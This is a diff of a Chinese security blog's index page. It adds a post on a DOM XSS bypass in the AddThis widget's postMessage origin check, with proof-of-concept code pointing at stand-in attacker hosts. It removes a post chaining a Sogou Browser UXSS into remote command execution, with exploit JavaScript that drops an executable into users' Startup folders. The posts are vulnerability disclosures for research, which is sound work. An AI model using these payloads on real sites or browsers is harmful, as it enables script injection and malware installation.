@@ -259,6 +259,142 @@
             
               
                 
+                <a class="post-title-link" href="/2016/12/25/DOM-XSS-Caused-by-AddThis/" itemprop="url">
+                  分享插件AddThis导致的DOM XSS
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-12-25T14:03:41+08:00" content="2016-12-25">
+              2016-12-25
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/12/25/DOM-XSS-Caused-by-AddThis/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/12/25/DOM-XSS-Caused-by-AddThis/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>说明：这个漏洞是 <a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/" target="_blank" rel="external">https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/</a> 修复的绕过，目前已经报告给AddThis并得到修复。</p>
+<blockquote>
+<p>AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等<br>From <a href="https://zh.wikipedia.org/wiki/AddThis" target="_blank" rel="external">https://zh.wikipedia.org/wiki/AddThis</a></p>
+</blockquote>
+<p>使用的例子有：</p>
+<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg" alt=""></p>
+<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30nhwnasj20rq0bddho.jpg" alt=""></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用这款插件，需要在网页上加入类似以下的代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Go to www.addthis.com/dashboard to customize your tools --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19"</span> <span class="attribute">async</span>=<span class="value">"async"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当插件加载完成后，就会监听<code>message</code>事件。</p>
+<p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1fb3110ele5j21340em79m.jpg" alt=""></p>
+<p>看完前面提到的那篇文章之后，我们可以知道在这个事件处理函数中，如果<code>message</code>事件处理函数接收到一个 <em>合法来源</em> 的消息，消息内容如下：<code>at-share-bookmarklet://example.com/xss.js</code>时，就会动态在页面中插入指定的JS脚本。之前的漏洞是在这里根本没有检查消息的来源就直接加载执行导致了DOM XSS，原先的PoC：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">id</span>=<span class="value">"frame"</span> <span class="attribute">src</span>=<span class="value">"https://targetpage/using_addthis"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'frame'</span>).contentWindow.postMessage(<span class="string">'at-share-bookmarklet://ATTACKERDOMAIN/xss.js'</span>, <span class="string">'*'</span>);</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>AddThis对这个漏洞进行的修复如下：</p>
+<ol>
+<li>添加检查当前窗口是不是被嵌套在：<code>iframe</code>, <code>frame</code>等标签里，如果是，则不监听<code>message</code>事件。</li>
+<li>检查来源</li>
+</ol>
+<p>修复后的代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">, c = <span class="built_in">window</span>.parent === <span class="built_in">window</span>;</span><br><span class="line">...</span><br><span class="line">c &amp;&amp; u(<span class="built_in">window</span>, <span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e) &#123;</span><br><span class="line">      <span class="keyword">var</span> t = _atr.substring(<span class="number">0</span>, _atr.length - <span class="number">1</span>)</span><br><span class="line">        , n = e.origin.indexOf(t) === <span class="string">"https:"</span>.length || e.origin.indexOf(t) === <span class="string">"http:"</span>.length || <span class="regexp">/^https?:\/\/(localhost:\d+|localhost$)/</span>.test(e.origin)</span><br><span class="line">        , o = <span class="string">"string"</span> == <span class="keyword">typeof</span> e.data;</span><br><span class="line">      <span class="keyword">if</span> (o &amp;&amp; n) &#123;</span><br><span class="line">          <span class="keyword">var</span> a = e.data.match(<span class="regexp">/at\-share\-bookmarklet\:(.+?)$/</span>) || []</span><br><span class="line">            , i = a[<span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> (i) &#123;</span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">                  _ate.menu.close()</span><br><span class="line">              &#125; <span class="keyword">catch</span> (s) &#123;&#125;</span><br><span class="line">              r(i)</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<ol>
+<li>其中<code>_attr</code>的值为<code>//s7.addthis.com/</code>，那么<code>t</code>的值就是<code>//s7.addthis.com</code></li>
+<li><code>e.origin</code>是调用了<code>postMessage</code>这个API的来源</li>
+<li>什么时候<code>o &amp;&amp; n</code>的值会是真呢？例如站点：<code>http://s7.addthis.com/</code>向目标站点发送消息的时候</li>
+</ol>
+<p>但这个修复真的没有问题了吗？在使用postMessage进行跨域通信的时候，有以下几种场景：</p>
+<ol>
+<li>父窗口与iframe，frame等标签里的子网页进行通信，即上面那个PoC</li>
+<li><p>使用window.open打开一个新的窗口</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="built_in">window</span>.open(<span class="string">"http://target.com/index.html"</span>);</span><br><span class="line">win.postMessage(<span class="string">"this is a message"</span>, <span class="string">"*"</span>);</span><br></pre></td></tr></table></figure>
+<p><code>http://target.com/index.html</code>这个页面就可以监听<code>message</code>事件获取到以上的消息。</p>
+</li>
+</ol>
+<p>也就是说，对于一个安装了这个插件的目标站点，我们依旧可以通过方法2发送一个消息给他。另外，这里的域名检查也不完善，简单的说，只要是<code>s7.addthis.com</code>开头的域名都是合法的，如<code>s7.addthis.com.evil.com</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; e.origin = <span class="string">'http://s7.addthis.com.evil.com'</span></span><br><span class="line">&gt; e.origin.indexOf(t) === <span class="string">"http:"</span>.length</span><br><span class="line">&lt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<script type="text/javascript" src="https://cdn.rawgit.com/zhchbin/zhchbin.github.io/source/js/addthis_widget.js"></script>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/10/15/YY-Browser-RCE/" itemprop="url">
                   [浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行
                 </a>
@@ -384,138 +520,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/10/06/Sogou-Browser-RCE/" itemprop="url">
-                  [浏览器安全系列三] 搜狗浏览器从UXSS到远程命令执行
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-10-06T10:57:48+08:00" content="2016-10-06">
-              2016-10-06
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/10/06/Sogou-Browser-RCE/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/10/06/Sogou-Browser-RCE/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>案例链接：<a href="http://www.wooyun.org/bugs/wooyun-2016-0213422" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0213422</a></p>
-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!</p>
-<h3 id="0x00-首先是UXSS"><a href="#0x00-首先是UXSS" class="headerlink" title="0x00 首先是UXSS"></a>0x00 首先是UXSS</h3><p>具体见：<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=569496" target="_blank" rel="external">https://bugs.chromium.org/p/chromium/issues/detail?id=569496</a></p>
-<p>浏览器版本号：6.3.8.21279</p>
-<h3 id="0x01-既然可以UXSS，我们找个特权域"><a href="#0x01-既然可以UXSS，我们找个特权域" class="headerlink" title="0x01 既然可以UXSS，我们找个特权域"></a>0x01 既然可以UXSS，我们找个特权域</h3><p>从漏洞 <a href="http://wooyun.org/bugs/wooyun-2010-0145023" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0145023</a> 我们可以知道搜狗浏览器的扩展有下载任意文件到任意位置的API！我们自己写一个恶意扩展，提交并通过审核的可能性基本为0。这个API这么好用，但又只能从：se-extension://域名下进行调用，好像很难构造吧。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sogouExplorer.downloads.downloadSilently(&#123;</span><br><span class="line">  url:"http://tmxk.org/img/r-c.png",</span><br><span class="line">  filename:"dd.exe",</span><br><span class="line">  path:"d:\",</span><br><span class="line">  method:"GET"</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-<p>我在想怎么利用上面的UXSS的时候，突发奇想的测试了一下，我们能不能打到se-extension://这个域名，于是进行一下测试。我找了一个搜狗浏览器安装时启用的默认扩展，找到其background.html的地址：<code>se-extension://ext238561744/background.html</code>。结果当然是没有那么容易，会提示如下的信息：</p>
-<blockquote>
-<p>Denying load of se-extension://ext238561744/background.html. Resources must be listed in the web_accessible_resources manifest key in order to be loaded by pages outside the extension.</p>
-</blockquote>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idldd42oj20hs0cstb1.jpg" alt=""></p>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idmtvo71j20ry0j0gou.jpg" alt=""></p>
-<h3 id="0x02-难道没法子？"><a href="#0x02-难道没法子？" class="headerlink" title="0x02 难道没法子？"></a>0x02 难道没法子？</h3><p>我认真的读了两秒这个提示后，原来还允许开发者通过<code>web_accessible_resources</code>指定某些资源，从而实现在扩展外被访问！当然，我们就去试试运气去默认的扩展下找找看有没有吧。搜狗浏览器安装的插件在这个目录下：</p>
-<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="command">\Users</span><span class="command">\Username</span><span class="command">\AppData</span><span class="command">\Roaming</span><span class="command">\SogouExplorer</span><span class="command">\Extension</span></span><br></pre></td></tr></table></figure>
-<p>grep一下，找到了一个插件，搜狗打假助手，<code>com.sogou.antiCrime</code>，其manifest.xml文件中有以下的内容：</p>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idowi21sj20n90h5465.jpg" alt="">)</p>
-<p>于是就把要打的域名地址换成了：</p>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">se-<span class="symbol">extension:</span>/<span class="regexp">/ext238561744/jd</span><span class="regexp">/images/ac</span>-logo.png</span><br></pre></td></tr></table></figure>
-<p>一开始我还觉得这是一个PNG图片，即使没有被拒绝访问，也应该用不了扩展的API吧。我本来是很怀疑能不能行的，正想放弃的时候，我还是觉得应该尝试一发。把PoC里的expolit.html里的f函数改一下，尝试下载一个文件到<code>c:\Users\</code>目录下。</p>
-<p>备注：后来想想其实也对，因为图片在浏览器打开的时候浏览器用自动的使用img标签插入来显示图片。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"f()"</span>)</span><br><span class="line">  <span class="keyword">if</span> (++c1 == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x1 = x.contentWindow[<span class="number">0</span>].frameElement.nextSibling;</span><br><span class="line">    <span class="comment">// x1.src = 'se-extension://ext238561744/background.html';         // Denied</span></span><br><span class="line">    x1.src = <span class="string">'se-extension://ext238561744/jd/images/ac-logo.png'</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (x1.contentDocument) &#123; ml(); &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      x1.src = <span class="string">"javascript:if(location != 'about:blank') &#123;console.log(location); sogouExplorer.downloads.downloadSilently(&#123;url:'http://127.0.0.1/test.js',filename:'test.js',path:'c:\\\\Users\\\\',method:'GET'&#125;);&#125;"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idw8oogbj20ru0ivgqz.jpg" alt=""></p>
-<h3 id="0x03-最终我们做到了！"><a href="#0x03-最终我们做到了！" class="headerlink" title="0x03 最终我们做到了！"></a>0x03 最终我们做到了！</h3><p>上面下载好文件之后，我们可以直接使用伪协议来执行，在 <a href="http://wooyun.org/bugs/wooyun-2010-0177221" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0177221</a> 最新版依旧没有加个提示什么的。而且现在我们又扩展名<code>.js</code>了。直接可以执行。当然，我们也可以写到用户的启动目录中，至于怎么拿到用户名，这个 <a href="http://wooyun.org/bugs/wooyun-2010-0176436" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0176436</a> 的漏洞都公开了，然后好像什么修复工作都没有做。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">"vbefile:/../../../../../../Users/test.js"</span></span><br></pre></td></tr></table></figure>
-<p>获取用户名的过程：用户访问open.html，跳转到data:域下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href = <span class="string">"data:text/html;base64,PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMjcuMC4wLjEvZXZpbC5qcyc+PC9zY3JpcHQ+"</span></span><br></pre></td></tr></table></figure></p>
-<p>其中base64解密后内容为：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">'http://127.0.0.1/evil.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>evil.js在data域下执行，可以获取到用户名列表，然后再跳转到需要写calc.exe到启动目录的页面中，完成写入操作！</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsers</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> users = data.match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/g</span>) || [];</span><br><span class="line">  <span class="keyword">var</span> currentUser=[];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; users.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> user = (users[i].match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/</span>) || [<span class="string">""</span>, <span class="string">""</span>])[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>([<span class="string">".."</span>, <span class="string">"All Users"</span>, <span class="string">"Default"</span>, <span class="string">"Default User"</span>, <span class="string">"Public"</span>, <span class="string">"UpdatusUser"</span>, <span class="string">"desktop.ini"</span>].indexOf(user) == -<span class="number">1</span>) &#123;</span><br><span class="line">      currentUser.push(user);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">console</span>.log(currentUser);</span><br><span class="line">  <span class="keyword">return</span> currentUser;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.external.extension(<span class="string">"getRecommendSidebarExts"</span>, <span class="string">"file:///C:/Users/"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span> (data.success != <span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  location.href = <span class="string">'http://127.0.0.1/exploit.html?users='</span> + getUsers(data.data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>写文件到启动目录下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"f()"</span>)</span><br><span class="line">  <span class="keyword">if</span> (++c1 == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> users = top.location.search.replace(<span class="string">'?users='</span>).split(<span class="string">','</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> x1 = x.contentWindow[<span class="number">0</span>].frameElement.nextSibling;</span><br><span class="line">    <span class="comment">// x1.src = 'se-extension://ext238561744/background.html';         // Denied</span></span><br><span class="line">    x1.src = <span class="string">'se-extension://ext238561744/jd/images/ac-logo.png'</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (x1.contentDocument) &#123; ml(); &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="keyword">var</span> users_str = <span class="string">''</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; users.length; ++i) &#123;</span><br><span class="line">        users_str += (<span class="string">'"'</span> + users[i] + <span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span> (i != users.length - <span class="number">1</span>)</span><br><span class="line">          users_str += <span class="string">','</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      x1.src = <span class="string">"javascript:if(location != 'about:blank') &#123; var users=["</span> + users_str + <span class="string">"]; for (var i = 0; i &lt; users.length; ++i) sogouExplorer.downloads.downloadSilently(&#123;url:'http://127.0.0.1/calc.exe',filename:'calc.exe',path:'C:\\\\Users\\\\' + users[i] + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\',method:'GET'&#125;);&#125;"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>录个用伪协议执行的GIF</p>
-<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f8idxtyw70g20sg0j2do4.gif" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -561,7 +565,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">17</span>
+              <span class="site-state-item-count">18</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
